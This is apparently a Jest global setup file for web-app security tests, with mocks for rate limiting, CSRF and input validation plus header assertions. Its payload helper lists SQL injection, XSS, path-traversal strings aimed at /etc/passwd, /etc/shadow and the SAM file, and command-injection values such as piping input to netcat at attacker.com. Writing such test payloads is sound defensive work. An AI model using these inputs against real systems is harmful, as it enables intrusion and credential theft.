/**
 * Security Test Setup
 * Global setup and utilities for security testing
 */

// Global test utilities
global.SecurityTestUtils = {
  
  // Mock security logger
  securityLogger: {
    warn: jest.fn(),
    error: jest.fn(),
    info: jest.fn(),
    debug: jest.fn()
  },

  // Mock rate limiter storage
  mockRateLimiterStorage: new Map(),

  // Mock session storage
  mockSessionStorage: new Map(),

  // Mock CSRF token storage
  mockCSRFStorage: new Map(),

  // Security test helpers
  generateMaliciousPayloads: () => ({
    sqlInjection: [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'; UPDATE users SET password='hacked' WHERE username='admin'; --"
    ],
    xss: [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ],
    commandInjection: [
      'input; ls -la',
      'input && cat /etc/passwd',
      'input | nc attacker.com 1234',
      'input `whoami`'
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      './../sensitive/file.txt',
      'file.txt/../../../etc/shadow'
    ]
  }),

  // Common security assertions
  assertNoScriptTags: (content) => {
    expect(content).not.toContain('<script');
    expect(content).not.toContain('javascript:');
    expect(content).not.toContain('onerror=');
    expect(content).not.toContain('onload=');
  },

  assertNoSQLKeywords: (content) => {
    const sqlKeywords = ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'UNION', 'SELECT'];
    for (const keyword of sqlKeywords) {
      expect(content.toUpperCase()).not.toContain(keyword);
    }
  },

  assertValidSecurityHeaders: (headers) => {
    expect(headers).toHaveProperty('X-Content-Type-Options', 'nosniff');
    expect(headers).toHaveProperty('X-Frame-Options', 'DENY');
    expect(headers).toHaveProperty('X-XSS-Protection', '1; mode=block');
    expect(headers).toHaveProperty('Strict-Transport-Security');
    expect(headers).toHaveProperty('Content-Security-Policy');
  },

  // Mock functions for security components
  mockSecurityMiddleware: {
    csrfProtection: jest.fn((req, res, next) => {
      req.csrfToken = () => 'mock-csrf-token';
      next();
    }),
    
    rateLimiter: jest.fn((req, res, next) => {
      const ip = req.ip || req.connection.remoteAddress;
      const rateLimitData = global.SecurityTestUtils.mockRateLimiterStorage.get(ip) || { count: 0, resetTime: Date.now() + 60000 };
      
      if (rateLimitData.count > 100) {
        return res.status(429).json({ error: 'Rate limit exceeded' });
      }
      
      rateLimitData.count++;
      global.SecurityTestUtils.mockRateLimiterStorage.set(ip, rateLimitData);
      next();
    }),

    inputValidation: jest.fn((req, res, next) => {
      // Mock input validation middleware
      const body = req.body;
      for (const [key, value] of Object.entries(body || {})) {
        if (typeof value === 'string' && /<script|javascript:|on\w+=/i.test(value)) {
          return res.status(400).json({ error: 'Invalid input detected' });
        }
      }
      next();
    })
  }
};

// Set up global mocks
beforeEach(() => {
  // Clear all mocks before each test
  jest.clearAllMocks();
  
  // Reset storage
  global.SecurityTestUtils.mockRateLimiterStorage.clear();
  global.SecurityTestUtils.mockSessionStorage.clear();
  global.SecurityTestUtils.mockCSRFStorage.clear();
  
  // Set up console spy to catch security warnings
  jest.spyOn(console, 'warn').mockImplementation(() => {});
  jest.spyOn(console, 'error').mockImplementation(() => {});
});

afterEach(() => {
  // Clean up after each test
  jest.restoreAllMocks();
});

// Global security test configuration
const securityConfig = {
  csrf: {
    secret: 'test-csrf-secret',
    cookieName: 'csrf-token',
    headerName: 'X-CSRF-Token'
  },
  rateLimit: {
    windowMs: 60000, // 1 minute
    max: 100, // limit each IP to 100 requests per windowMs
    standardHeaders: true,
    legacyHeaders: false
  },
  session: {
    secret: 'test-session-secret',
    name: 'sessionId',
    cookie: {
      secure: true,
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
  }
};

global.securityConfig = securityConfig;
